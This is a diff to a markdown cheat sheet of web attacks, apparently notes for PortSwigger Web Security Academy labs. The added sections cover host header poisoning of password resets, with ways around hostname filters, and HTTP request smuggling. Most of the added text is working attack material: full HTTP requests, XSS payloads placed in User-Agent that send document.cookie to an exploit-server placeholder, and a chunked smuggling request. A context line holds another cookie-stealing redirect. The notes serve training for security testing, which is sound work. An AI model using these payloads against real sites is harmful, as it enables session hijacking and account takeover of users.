@@ -133,19 +133,66 @@ document.location='https://XX-EXPLOIT-SERVER-URL-XX?x='+document.cookie;
 GET / HTTP/1.1
 X-Forwarded-For: XX-DOMAIN-NAME-EXPLOIT-SERVER-XX
 ```
-# XSS Blacklisted Tags & Attributes
+# Host Header Poisoning
 ## Detect:
 ```
+Login, there is a "forgot password" form. Try username "administrator" and receive a message such as "An email has been sent to reset the password". If you enter a non-existing username such as "randomname" the message will be different.
+
+Perform username enumeration like other bruteforce case.
 ```
 ## Exploit:
 ```
+Send the password reset feature to the ParamMiner extension > Guess headers. It will identify header injection such as:
+X-Host
+X-Forwarded-Host
+X-Forwarded-For
+etc.
+
+POST /forgot_password HTTP/1.1
+Host: LAB-URL.web-security-academy.net
+X-Forwarded-Host: XX_EXPLOIT_SERVER.web-security-academy.net
+
+If returns the error "Invalid hostname", bypass the filter:
+X-Forwarded-Host: XX_EXPLOIT_SERVER.web-security-academy.net/?foo=XX_LAB_SERVER.net
+X-Forwarded-Host: LAB-URL.web-security-academy.net:password@XX_EXPLOIT_SERVER.web-security-academy.net
+
+Possible filters to bypass:
+# & ? = @
 ```
-# XSS Blacklisted Tags & Attributes
+# HTTP Request Smuggling
 ## Detect:
 ```
+XSS in the User-Agent found with active scanner when retrieving a comment page.
 ```
 ## Exploit:
 ```
+GET /post?postId=1 HTTP/1.1
+Host: LAB-SERVER.web-security-academy.net
+User-Agent: "><script>alert(1);</script>
+
+GET /post?postId=1 HTTP/1.1
+Host: LAB-URL.web-security-academy.net
+User-Agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();x.open("GET","https://XX_EXPLOIT_SERVER.web-security-academy.net/"+document.cookie);x.send();</script>
+
+Send multiple times from repeater:
+POST /post/comment?c=0 HTTP/1.1
+Host: LAB-SERVER.web-security-academy.net
+Cookie: session=XXXXXXXXXXXXXXXXXX; _lab_analytics=XXXXXXXXXXXXXXXXXXXXXXXXXX; _lab=XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+Origin: https://LAB-SERVER.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Transfer-Encoding: chunked, identity
+Content-Length: 588
+Connection: keep-alive
+
+11c
+368j9=x&csrf=XXXXXXXXXXXXXXXXXXXXXXX&userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.6478.127+Safari%2F537.36&postId=1&comment=test&name=test&email=test%40test.test&website=http%3A%2F%2Ftest.test&wdsna=x
+0
+
+GET /post?postId=1 HTTP/1.1
+Host: LAB-SERVER.web-security-academy.net
+User-Agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();x.open("GET","https://XX_EXPLOIT_SERVER.web-security-academy.net/c-"+document.cookie);x.send();</script>
 ```
 # XSS Blacklisted Tags & Attributes
 ## Detect:
